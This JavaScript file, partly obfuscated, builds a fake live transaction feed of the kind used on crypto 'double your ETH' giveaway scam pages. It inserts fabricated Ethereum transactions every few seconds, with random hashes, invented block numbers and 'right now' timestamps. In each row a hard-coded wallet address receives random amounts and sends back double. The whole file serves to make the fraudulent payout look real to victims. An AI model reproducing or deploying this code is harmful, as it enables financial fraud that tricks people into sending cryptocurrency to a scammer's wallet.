function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for(let i = 0; i <ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

function randomString(_0xe480x2) {
    var _0xe480x3 = '';
    var _0xe480x4 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var _0xe480x5 = _0xe480x4['length'];
    for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
        _0xe480x3 += _0xe480x4['charAt'](Math['floor'](Math['random']() * _0xe480x5))
    };
    return _0xe480x3
}

function randomStringHashBTC(_0xe480x2) {
    var _0xe480x3 = '';
    var _0xe480x4 = 'bacfed0123456789';
    var _0xe480x5 = _0xe480x4['length'];
    for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
        _0xe480x3 += _0xe480x4['charAt'](Math['floor'](Math['random']() * _0xe480x5))
    };
    return _0xe480x3
}

var divCounter = 0;

function randomInteger(min, max) {
    let rand = min + Math.random() * (max - min);
    return Math.round(rand);
}

function randomIntegerBTC(min, max) {
    let rand = min + Math.random() * (max - min);
    return rand.toFixed(2);
}

function getRundomMnogitel() {
    let asd = [1, 0.1, 0.01];
    let getRandom = Math.floor(Math.random() * asd.length);
    return asd[getRandom];
}

var blocksNum = parseInt("1349" + randomInteger(1, 9) + randomInteger(1, 9) + randomInteger(1, 9) + randomInteger(1, 9));

function genDiv() {
    divCounter++;
    let valet = '0xEaCEEC3f479fb0ED94a55457DBd95F9A0Ca81cD2'
    var _0xe480x9 =
        `${'<div class="row-item"> <div class="top"> <div class="data"> <div class="item">{t1}</div><div class="item">{t2}</div><div class="item">{t4}</div><div class="item icon-done"></div><div class="item">{t6}</div><div class="item">{t3}</div><div class="item">{t7}</div><div class="item">{t8}</div></div></div><div class="bottom"> <div class="data"> <div class="item"></div><div class="item"></div><div class="item">{b4}</div><div class="item"></div><div class="item">{b6}</div><div class="item">{b3}</div><div class="item">{b7}</div><div class="item"></div></div></div></div>'}`;
    let _0xe480xa = randomStringHashBTC(10) + '...';
    blocksNum = blocksNum+randomInteger(1, 200)
    let _0xe480xb = blocksNum;
    let _0xe480xc = 'right now';
    let _0xe480xd = '0x' + randomString(6) + '...';
    let _0xe480xe = '';
    let _0xe480xf = valet.substring(0, 7);
    let valueSend = randomIntegerBTC(0.01, 100);
    let _0xe480x10 = valueSend + ' ETH';
    let _0xe480x11 = ((Math['random']() * 0.09 * getRundomMnogitel()) + 0.00001 * getRundomMnogitel())[
        'toFixed'](6);
    let _0xe480x12 = randomStringHashBTC(10) + '...';
    let _0xe480x13 = blocksNum;
    let _0xe480x14 = 'right now';
    let _0xe480x15 = _0xe480xf.slice(0, 10) + "...";
    let _0xe480x16 = '';
    let _0xe480x17 = _0xe480xd;
    let _0xe480x18 = (valueSend * 2) + ' ETH';
    let _0xe480x19 = ((Math['random']() * 0.09 * getRundomMnogitel()) + 0.00001 * getRundomMnogitel())[
        'toFixed'](6);
    _0xe480x9 = _0xe480x9['replace']('{t1}', _0xe480x12);
    _0xe480x9 = _0xe480x9['replace']('{t2}', _0xe480x13);
    _0xe480x9 = _0xe480x9['replace']('{t3}', _0xe480x14);
    _0xe480x9 = _0xe480x9['replace']('{t4}', _0xe480x15);
    _0xe480x9 = _0xe480x9['replace']('{t5}', _0xe480x16);
    _0xe480x9 = _0xe480x9['replace']('{t6}', _0xe480x17);
    _0xe480x9 = _0xe480x9['replace']('{t7}', _0xe480x18);
    _0xe480x9 = _0xe480x9['replace']('{t8}', _0xe480x19);
    _0xe480x9 = _0xe480x9['replace']('{b1}', _0xe480xa);
    _0xe480x9 = _0xe480x9['replace']('{b2}', _0xe480xb);
    _0xe480x9 = _0xe480x9['replace']('{b3}', _0xe480xc);
    _0xe480x9 = _0xe480x9['replace']('{b4}', _0xe480xd);
    _0xe480x9 = _0xe480x9['replace']('{b5}', _0xe480xe);
    _0xe480x9 = _0xe480x9['replace']('{b6}', _0xe480x15);
    _0xe480x9 = _0xe480x9['replace']('{b7}', _0xe480x10);
    _0xe480x9 = _0xe480x9['replace']('{b8}', _0xe480x11);
    var _0xe480x1a = $(_0xe480x9)['prependTo']('.body-table');
    $(".body-table .row-item:nth-child(4)").nextAll().remove();

    setTimeout(genDiv, randomInteger(3000, 12000))
}

$(document)['ready'](function () {
    genDiv();
})
